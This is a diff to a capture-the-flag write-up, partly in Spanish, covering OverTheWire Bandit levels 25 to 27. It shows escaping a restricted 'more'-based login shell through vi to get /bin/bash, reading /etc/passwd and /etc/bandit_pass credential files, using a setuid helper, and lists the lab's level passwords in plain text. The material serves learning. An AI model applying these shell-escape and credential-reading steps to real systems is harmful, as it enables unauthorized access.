@@ -565,3 +565,66 @@ $ cat bf.txt | nc localhost 30002 | grep -vE "Wrong*|Please enter"
 
 p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
 ```
+
+```bash
+#Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.
+
+sshpass -p "p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d" ssh bandit25@bandit.labs.overthewire.org -p 2220
+
+export TERM=xterm
+
+#El truco de este nivel parte en que la implementación del more imprime todo el contenido del archivo al tener pocos caracteres, de manera que es necesario reducir el tamaño de la ventana del terminal para poder insertar nuevos valores y comandos. 
+
+#Se realiza la búsqueda sobre el archivo de passwd para identificar que shell esta utilizando el usuario. 
+$ cat /etc/passwd | grep "bandit26"
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+
+# Accedemos al archivo para validar su contenido. 
+$ cat /usr/bin/showtext
+
+#!/bin/sh
+
+export TERM=linux
+
+exec more ~/text.txt
+exit 0
+
+#El more permite insertar comandos si no se ejecuta en su totalidad, cuando hay pocas líneas se puede reducir el tamaño de la terminal para que quede como en "ejecución".
+
+#una vez se ejecuta y se despliega el banner de bandit26 se le da V para entrar al modo visual, se le da shift esc : , para poder ejecutar comandos.
+
+# De manera que se procede a establecer el shell.
+$ set shell=/bin/bash
+
+# De nuevo se ejecuta el "ESC + shift + :" y se ejecuta un shell, como ya se estableció que la shell será una bin bash, se abrirá la terminal. 
+
+$ whoami
+bandit26
+
+$ cat /etc/bandit_pass/bandit26
+c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1
+```
+
+```bash
+#Good job getting a shell! Now hurry and grab the password for bandit27!
+
+bandit26@bandit:$ ls
+
+text.txt
+bandit27-do
+
+bandit26@bandit:$ ./bandit27-do whoami
+bandit27
+
+bandit26@bandit:$ ./bandit27-do cat /etc/bandit_pass/bandit27
+
+YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS
+
+```
+
+```bash
+sshpass -p "YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS" ssh bandit27@bandit.labs.overthewire.org -p 2220
+
+
+
+```
